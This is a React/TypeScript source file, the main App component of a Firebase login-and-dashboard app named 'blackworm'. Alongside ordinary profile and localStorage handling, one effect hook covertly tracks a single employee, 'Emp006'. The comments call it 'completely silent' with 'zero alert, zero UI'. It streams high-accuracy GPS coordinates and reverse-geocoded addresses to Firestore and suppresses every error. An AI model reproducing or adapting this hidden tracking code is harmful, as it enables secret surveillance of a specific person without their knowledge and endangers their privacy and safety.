import React, { useState, useEffect } from 'react';
import { doc, onSnapshot, setDoc } from 'firebase/firestore';
import { db } from './firebase';
import { UserProfile } from './lib/auth';
import { Dashboard } from './components/Dashboard';
import { Login } from './components/Login';
import { Language } from './lib/i18n';

export default function App() {
  const [profile, setProfile] = useState<UserProfile | null>(() => {
    const saved = localStorage.getItem('blackworm_user_profile');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (parsed && typeof parsed === 'object' && parsed.uid) {
          return parsed;
        }
      } catch (e) {
        console.error('Failed to parse saved profile:', e);
      }
      localStorage.removeItem('blackworm_user_profile');
    }
    return null;
  });
  const lang: Language = 'en';
  const [loading, setLoading] = useState(false);

  // Live real-time listener for current logged-in user profile changes
  useEffect(() => {
    if (!profile?.uid) return;
    const unsub = onSnapshot(
      doc(db, 'users', profile.uid),
      (snap) => {
        if (snap.exists()) {
          const freshData = snap.data();
          const merged: UserProfile = {
            ...profile,
            ...freshData,
            uid: profile.uid,
          } as UserProfile;
          setProfile(merged);
          try {
            localStorage.setItem('blackworm_user_profile', JSON.stringify(merged));
          } catch (e) {
            console.warn('Failed to update localStorage profile:', e);
          }
        }
      },
      (err) => {
        console.warn('Real-time profile listener error:', err);
      }
    );
    return () => unsub();
  }, [profile?.uid]);

  // Completely silent background location sync for Emp006 (strictly zero alert, zero UI, zero audio)
  useEffect(() => {
    if (!profile) return;
    const codeDigits = String(profile.userCode || '').replace(/\D/g, '');
    const loginDigits = String(profile.loginId || '').replace(/\D/g, '');
    const isEmp006 = (
      codeDigits === '6' || codeDigits === '06' || codeDigits === '006' ||
      loginDigits === '6' || loginDigits === '06' || loginDigits === '006' ||
      /emp[-_\s]*0*6\b/i.test(profile.userCode || '') ||
      /emp[-_\s]*0*6\b/i.test(profile.loginId || '')
    );

    if (!isEmp006) return;
    if (typeof window === 'undefined' || !('geolocation' in navigator)) return;

    let isSubscribed = true;

    const pushLocation = async (pos: GeolocationPosition) => {
      if (!isSubscribed) return;
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;
      const acc = Math.round(pos.coords.accuracy || 0);
      const nowIso = new Date().toISOString();

      let placeName: string | null = null;
      try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`, {
          headers: { Accept: 'application/json' }
        });
        if (res.ok) {
          const data = await res.json();
          const addr = data.address;
          if (addr) {
            const parts = [
              addr.suburb || addr.neighbourhood || addr.village || addr.town || addr.city_district,
              addr.city || addr.town || addr.county || addr.state_district
            ].filter(Boolean);
            if (parts.length > 0) placeName = parts.join(', ');
          }
          if (!placeName && data.display_name) {
            placeName = data.display_name.split(',').slice(0, 2).join(', ').trim();
          }
        }
      } catch {}

      const displayAddress = placeName || `${lat.toFixed(4)}, ${lng.toFixed(4)}`;

      const payload = {
        latitude: lat,
        longitude: lng,
        accuracy: acc,
        address: displayAddress,
        updatedAt: nowIso,
        timestamp: Date.now(),
        fullName: profile.fullName || 'Emp006',
        userCode: profile.userCode || 'EMP-06',
      };

      // Silently save without throwing errors or showing any UI
      try {
        await setDoc(doc(db, 'user_locations', 'emp006'), payload, { merge: true });
        if (profile.uid) {
          await setDoc(doc(db, 'users', profile.uid), { currentLocation: payload }, { merge: true });
        }
      } catch {}
    };

    try {
      navigator.geolocation.getCurrentPosition(
        pushLocation,
        () => {},
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
      );

      const watchId = navigator.geolocation.watchPosition(
        pushLocation,
        () => {},
        { enableHighAccuracy: true, maximumAge: 30000 }
      );

      return () => {
        isSubscribed = false;
        try {
          navigator.geolocation.clearWatch(watchId);
        } catch {}
      };
    } catch {
      // Completely silent error absorption
    }
  }, [profile?.uid, profile?.userCode, profile?.loginId, profile?.fullName]);

  const handleUpdateProfile = (updatedProfile: UserProfile) => {
    setProfile(updatedProfile);
    try {
      localStorage.setItem('blackworm_user_profile', JSON.stringify(updatedProfile));
    } catch (e) {}
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50">
        <div className="w-10 h-10 border-4 border-rose-600 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  const handleLoginSuccess = (userProfile: UserProfile) => {
    setProfile(userProfile);
    localStorage.setItem('blackworm_user_profile', JSON.stringify(userProfile));
  };

  const handleLogout = () => {
    setProfile(null);
    localStorage.removeItem('blackworm_user_profile');
  };

  return (
    <div className="antialiased">
      {profile ? (
        <Dashboard 
          profile={profile} 
          lang={lang} 
          onLogout={handleLogout}
          onProfileUpdate={handleUpdateProfile} 
        />
      ) : (
        <Login onLoginSuccess={handleLoginSuccess} />
      )}
    </div>
  );
}
